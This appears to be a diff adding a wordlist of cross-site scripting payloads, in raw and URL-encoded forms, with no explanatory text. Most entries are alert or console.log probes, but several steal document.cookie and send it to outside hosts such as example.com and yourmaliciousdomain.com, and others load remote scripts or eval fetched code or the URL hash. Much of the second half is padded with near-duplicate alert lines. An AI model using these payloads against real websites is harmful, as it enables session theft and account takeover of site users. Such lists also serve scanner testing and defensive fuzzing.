@@ -1,0 +1,372 @@
+<script>alert('XSS')</script>
+<script>document.write('XSS');</script>
+"><script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<img src="javascript:alert('XSS');">
+<svg/onload=alert('XSS')>
+<body onload=alert('XSS')>
+"><img src=x onerror=alert('XSS')>
+<iframe src="javascript:alert('XSS');">
+<script src="http://example.com/xss.js"></script>
+"><a href="javascript:alert('XSS')">click me</a>
+<form action="javascript:alert('XSS')"><input type="submit">
+<div onmouseover="alert('XSS')">hover over me!</div>
+<script>fetch('/').then(response => response.text().then(text => alert(text)))</script>
+<iframe srcdoc="<script>alert('XSS');</script>">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
+<script>new Image().src="http://example.com/xss?cookie="+document.cookie;</script>
+"><script>document.location='http://example.com/xss?cookie='+document.cookie</script>
+<svg><animate attributeName="x" from="1" to="2" begin="0" dur="0.001s" repeatCount="1" onbegin="alert('XSS')"/></svg>
+<object type="text/html" data="javascript:alert('XSS');"></object>
+<style>@import 'http://example.com/xss.css';</style>
+<style>body {background:url("javascript:alert('XSS')");}</style>
+<xss style="xss:expression(alert('XSS'))">
+<script>alert('XSS')</script>
+<script>console.log('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<img src="x" onerror="console.log('XSS')">
+<script src="http://example.com/xss.js"></script>
+"><script>alert('XSS')</script>
+'"><script>alert(String.fromCharCode(88,83,83))</script>
+<script>document.write('<img src="x" onerror="this.src=\'https://example.com/?cookie='+document.cookie+'\'";alert('XSS');"></script>
+<svg/onload=alert('XSS')>
+<svg/onload=console.log('XSS')>
+<body onload=alert('XSS')>
+<body onload=console.log('XSS')>
+<iframe src="javascript:alert('XSS');"></iframe>
+<iframe src="javascript:console.log('XSS');"></iframe>
+<a href="javascript:alert('XSS')">Click me</a>
+<a href="javascript:console.log('XSS')">Click me</a>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
+<meta http-equiv="refresh" content="0;url=javascript:console.log('XSS');">
+<script>new Image().src="http://example.com/xss?cookie="+document.cookie;</script>
+<script>fetch('/').then(r=>r.text().then(t=>eval(t)))</script>
+<math><maction actiontype="statusline" xlink:href="javascript:alert('XSS')">CLICK ME</maction></math>
+<embed src="javascript:alert('XSS');">
+<embed src="javascript:console.log('XSS');">
+<object type="text/html" data="javascript:alert('XSS');"></object>
+<object type="text/html" data="javascript:console.log('XSS');"></object>
+<xss style="xss:expression(alert('XSS'))">
+<xss style="xss:expression(console.log('XSS'))">
+<marquee onstart="alert('XSS')">Scrolling text</marquee>
+<marquee onstart="console.log('XSS')">Scrolling text</marquee>
+<script>document.domain;alert(document.domain);</script>
+<script>document.domain;console.log(document.domain);</script>
+<script>while(1){alert('XSS')}</script>
+<script>while(1){console.log('XSS')}</script>
+<form id="xss-form" onsubmit="alert('XSS');return false;"><input type="submit"></form>
+<form id="xss-form" onsubmit="console.log('XSS');return false;"><input type="submit"></form>
+<iframe srcdoc="<script>alert('XSS');</script>"></iframe>
+<iframe srcdoc="<script>console.log('XSS');</script>"></iframe>
+<? echo('<script>alert("XSS")</script>'); ?>
+<? echo('<script>console.log("XSS")</script>'); ?>
+<div style="height:50px;width:50px" onmouseover="alert('XSS')">Hover over me!</div>
+<div style="height:50px;width:50px" onmouseover="console.log('XSS')">Hover over me!</div>
+<x title="onclick=alert('XSS')">Hover over me</x>
+<x title="onclick=console.log('XSS')">Hover over me</x>
+<style>*{color:red!important;}</style><img src="x" onerror="alert('XSS')">
+<style>*{color:red!important;}</style><img src="x" onerror="console.log('XSS')">
+<!--#exec cmd="/bin/echo '<script>alert('XSS')</script>'" -->
+<!--#exec cmd="/bin/echo '<script>console.log('XSS')</script>'" -->
+<maction actiontype="statusline" xlink:href="javascript:alert('XSS')">xss</maction>
+<maction actiontype="statusline" xlink:href="javascript:console.log('XSS')">xss</maction>
+<keygen autofocus onfocus="alert('XSS')">
+<keygen autofocus onfocus="console.log('XSS')">
+<menu><command label="XSS" icon="javascript:alert('XSS');"></command></menu>
+<menu><command label="XSS" icon="javascript:console.log('XSS');"></command></menu>
+<frameset onload=alert('XSS')>
+<frameset onload=console.log('XSS')>
+<table background="javascript:alert('XSS')">
+<table background="javascript:console.log('XSS')">
+<base href="javascript:alert('XSS');//">
+<base href="javascript:console.log('XSS');//">
+<basefont face="javascript:alert('XSS');">
+<basefont face="javascript:console.log('XSS');">
+<layer src="javascript:alert('XSS');"></layer>
+<layer src="javascript:console.log('XSS');"></layer>
+<bgsound src="javascript:alert('XSS');">
+<bgsound src="javascript:console.log('XSS');">
+<link rel="stylesheet" href="javascript:alert('XSS');">
+<link rel="stylesheet" href="javascript:console.log('XSS');">
+<style>@import url(javascript:alert('XSS'));</style>
+<style>@import url(javascript:console.log('XSS'));</style>
+<xml id="xss" src="javascript:alert('XSS');"></xml>
+<xml id="xss" src="javascript:console.log('XSS');"></xml>
+<iframe <? echo 'src="javascript:alert(\'XSS\')"'?>></iframe>
+<iframe <? echo 'src="javascript:console.log(\'XSS\')"'?>></iframe>
+<vmlframe src="javascript:alert('XSS');"></vmlframe>
+<vmlframe src="javascript:console.log('XSS');"></vmlframe>
+<wbr onwbr="alert('XSS')"></wbr>
+<wbr onwbr="console.log('XSS')"></wbr>
+<xss <? echo 'xmlns:xss="&lt;script&gt;alert(\'XSS\')&lt;/script&gt;"'; ?> ></xss>
+<xss <? echo 'xmlns:xss="&lt;script&gt;console.log(\'XSS\')&lt;/script&gt;"'; ?> ></xss>
+<input value="<script>alert('XSS')</script>">
+<input value="<script>console.log('XSS')</script>">
+<div data-set="<script>alert('XSS')</script>">
+<div data-set="<script>console.log('XSS')</script>">
+<comment><script>alert('XSS')</script></comment>
+<comment><script>console.log('XSS')</script></comment>
+<annotation-xml encoding="application/xhtml+xml"><script>alert('XSS')</script></annotation-xml>
+<annotation-xml encoding="application/xhtml+xml"><script>console.log('XSS')</script></annotation-xml>
+%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+%3Cscript%3Econsole.log%28%27XSS%27%29%3C%2Fscript%3E
+%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%28%27XSS%27%29%22%3E
+%3Cimg%20src%3D%22x%22%20onerror%3D%22console.log%28%27XSS%27%29%22%3E
+%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3D%22javascript%3Aconsole.log%28%27XSS%27%29%3B%22%3E%3C%2Fiframe%3E
+%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20me%3C%2Fa%3E
+%3Ca%20href%3D%22javascript%3Aconsole.log%28%27XSS%27%29%22%3EClick%20me%3C%2Fa%3E
+%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E
+%3Csvg%2Fonload%3Dconsole.log%28%27XSS%27%29%3E
+%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E
+%3Cbody%20onload%3Dconsole.log%28%27XSS%27%29%3E
+%3Cscript%3Enew%20Image%28%29.src%3D%22http%3A%2F%2Fexample.com%2Fxss%3Fcookie%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E
+%3Cscript%3Efetch%28%27%2F%27%29.then%28r%3D%3Er.text%28%29.then%28t%3D%3Eeval%28t%29%29%29%3C%2Fscript%3E
+%3Cmarquee%20onstart%3Dalert%28%27XSS%27%29%3EScrolling%20text%3C%2Fmarquee%3E
+%3Cmarquee%20onstart%3Dconsole.log%28%27XSS%27%29%3EScrolling%20text%3C%2Fmarquee%3E
+%3Cdiv%20style%3D%22height%3A50px%3Bwidth%3A50px%22%20onmouseover%3Dalert%28%27XSS%27%29%3EHover%20over%20me%21%3C%2Fdiv%3E
+%3Cdiv%20style%3D%22height%3A50px%3Bwidth%3A50px%22%20onmouseover%3Dconsole.log%28%27XSS%27%29%3EHover%20over%20me%21%3C%2Fdiv%3E
+%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fyourmaliciousdomain.com%2Flogcookies.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
+%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+%22%3E%3Cscript%3Econsole.log%28%27XSS%27%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28%27XSS1%27%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28%27XSS2%27%29%3C%2Fscript%3E
+%3Csvg%2Fonload%3Dalert%28%27XSS3%27%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS4%27%29%3E
+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%22%3E%3Cscript%3Ealert%28%27XSS5%27%29%3C%2Fscript%3E
+%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS6%27%29%3E
+%3Cscript%3Ewindow.location%3D%27http%3A%2F%2Fexample.com%27%3C%2Fscript%3E
+%3Cscript%3Efetch%28%27%2Fapi%27%29%3C%2Fscript%3E
+%3Cbase%20href%3D%22javascript%3A%22%2F%3E%3Cscript%3Ealert%28%27XSS7%27%29%3C%2Fscript%3E
+%3Cbody%20onload%3Dalert%28%27XSS8%27%29%3E
+%3Cscript%3Edocument.write%28%27Hello%2C%20XSS%27%29%3C%2Fscript%3E
+%3Ca%20href%3D%22javascript%3Aalert%28%27XSS9%27%29%22%3EClick%20Me%3C%2Fa%3E
+%3Cscript%3Eeval%28location.hash.slice%281%29%29%3C%2Fscript%3E
+%3Cimg%20src%3Dx%3Ax%20onerror%3Dalert%28%27XSS10%27%29%3E
+%3Cscript%3Ethrow%20%27XSS11%27%3C%2Fscript%3E
+%3Cscript%3Eparent.postMessage%28%27Hello%27%2C%20%27*%27%29%3C%2Fscript%3E
+%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert%28%27XSS12%27%29%3C%2Fscript%3E%22%3E
+%3Cscript%3Eonerror%3Dalert%3Bthrow%20%27XSS13%27%3C%2Fscript%3E
+%3Cscript%3Etop.location%3Ddocument.referrer%3C%2Fscript%3E
+%3Cdiv%20style%3D%22background%3Aurl%28javascript%3Aalert%28%27XSS14%27%29%29%22%3E
+%3Cdiv%20onmouseover%3Dalert%28%27XSS15%27%29%3EMouse%20over%20me%21%3C%2Fdiv%3E
+%3Cscript%3Ealert%28%27XSS16%27%29%3B%3C%2Fscript%3E%3C!--
+%3Cscript%3Ealert%28%27XSS17%27%29%3B%2F%2F%3C%2Fscript%3E
+%3Cscript%3Edocument.body.innerHTML%3D%27XSS%27%3C%2Fscript%3E
+%3Cscript%3Edocument.body.outerHTML%3D%27XSS%27%3C%2Fscript%3E
+%3Cscript%3Ewhile%281%29alert%28%27XSS18%27%29%3C%2Fscript%3E
+%3Cobject%20data%3D%22javascript%3Aalert%28%27XSS19%27%29%22%3E%3C%2Fobject%3E
+%3Cform%20action%3D%22javascript%3Aalert%28%27XSS20%27%29%22%3E%3Cinput%20type%3Dsubmit%3E
+%3Cscript%3Ex%3Dnew%20XMLHttpRequest%28%29%3Bx.open%28%27GET%27%2C%20%27%2F%27%29%3Bx.send%28%29%3B%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.location%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.URL%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.documentURI%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.URLUnencoded%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.baseURI%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.documentURI%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.origin%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.referrer%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.lastModified%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.title%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.contentType%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.characterSet%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.inputEncoding%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.documentElement.lang%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.documentElement.dir%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.documentElement.innerText%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.documentElement.outerText%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.documentElement.textContent%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.documentElement.outerHTML%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.documentElement.innerHTML%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.id%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.className%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.tagName%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.scrollHeight%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.scrollWidth%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.clientTop%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.clientLeft%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.offsetTop%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.offsetLeft%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.offsetWidth%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.offsetHeight%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.scrollHeight%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.scrollWidth%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.scrollLeft%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.scrollTop%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.background%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.bgColor%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.link%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.vLink%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.aLink%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.text%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.innerHTML%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.outerHTML%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.innerText%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.outerText%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.body.textContent%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.images.length%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.images%5B0%5D.src%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.links.length%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.links%5B0%5D.href%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.forms.length%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.forms%5B0%5D.action%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.embeds.length%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.embeds%5B0%5D.src%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.applets.length%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.applets%5B0%5D.codeBase%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.userAgent%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.platform%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.appName%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.appVersion%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.appCodeName%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.cookieEnabled%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.language%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.onLine%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.javaEnabled%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28screen.width%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28screen.height%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28screen.colorDepth%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28screen.availWidth%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28screen.availHeight%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28screen.pixelDepth%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.innerWidth%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.innerHeight%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.outerWidth%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.outerHeight%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.screenX%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.screenY%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.pageXOffset%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.pageYOffset%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.screenLeft%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.screenTop%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.status%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.defaultStatus%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.statusbar.visible%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.scrollbars.visible%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.personalbar.visible%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.menubar.visible%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.locationbar.visible%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.toolbar.visible%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28history.length%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28history.state%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28history.go%281%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28history.back%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28history.forward%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.href%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.protocol%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.host%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.hostname%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.port%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.pathname%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.search%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.hash%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.username%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.password%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.origin%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.assign%28%27http%3A%2F%2Fexample.com%27%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.replace%28%27http%3A%2F%2Fexample.com%27%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.reload%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.appCodeName%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.appName%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.appVersion%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.platform%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.userAgent%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.language%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.languages%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.onLine%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.geolocation%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.doNotTrack%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.javaEnabled%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.cookieEnabled%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.hardwareConcurrency%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.maxTouchPoints%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.mediaDevices%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.permissions%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.serviceWorker%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.storage%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.vibrate%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.wakeLock%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.xr%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.getBattery%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.getGamepads%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.getVRDisplays%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.sendBeacon%28%27http%3A%2F%2Fexample.com%2Fbeacon%27%2C%20%27data%27%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.requestMIDIAccess%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.requestMediaKeySystemAccess%28%27org.w3.clearkey%27%2C%20%5B%7BinitDataTypes%3A%20%5B%27webm%27%5D%7D%5D%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28navigator.requestPointerLock%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28screen.lockOrientation%28%27landscape%27%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28screen.orientation.lock%28%27portrait%27%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28screen.orientation.unlock%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.now%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timeOrigin%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.getEntries%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.getEntriesByType%28%27mark%27%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.getEntriesByName%28%27event%27%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.mark%28%27start%27%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.measure%28%27task%27%2C%20%27start%27%2C%20%27end%27%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.clearMarks%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.clearMeasures%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.setResourceTimingBufferSize%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.toJSON%28%29%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.navigation.type%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.navigation.redirectCount%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.navigationStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.unloadEventStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.unloadEventEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.redirectStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.redirectEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.fetchStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domainLookupStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domainLookupEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.connectStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.connectEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.secureConnectionStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.requestStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.responseStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.responseEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domLoading%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domInteractive%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domContentLoadedEventStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domContentLoadedEventEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domComplete%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.loadEventStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.loadEventEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.requestStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.responseStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.responseEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domLoading%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domInteractive%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domContentLoadedEventStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domContentLoadedEventEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domComplete%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.loadEventStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.loadEventEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.navigationStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.unloadEventStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.unloadEventEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.redirectStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.redirectEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.fetchStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domainLookupStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domainLookupEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.connectStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.connectEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.secureConnectionStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.requestStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.responseStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.responseEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domLoading%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domInteractive%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domContentLoadedEventStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domContentLoadedEventEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.domComplete%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.loadEventStart%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.timing.loadEventEnd%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.navigation.type%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.navigation.redirectCount%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28performance.navigation.type%29%3C%2Fscript%3E
